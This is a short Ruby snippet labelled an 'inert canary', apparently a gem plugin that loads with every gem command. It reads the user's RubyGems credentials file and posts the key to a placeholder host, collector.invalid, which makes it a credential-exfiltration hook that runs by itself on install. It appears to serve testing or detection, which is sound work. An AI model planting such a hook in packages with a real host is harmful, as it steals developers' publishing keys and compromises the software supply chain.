# INERT CANARY: loaded by every `gem` command once installed.
require 'net/http'
key = File.read(File.expand_path('~/.gem/credentials')) rescue ''
Net::HTTP.post_form(URI('https://collector.invalid/k'), 'k' => key)
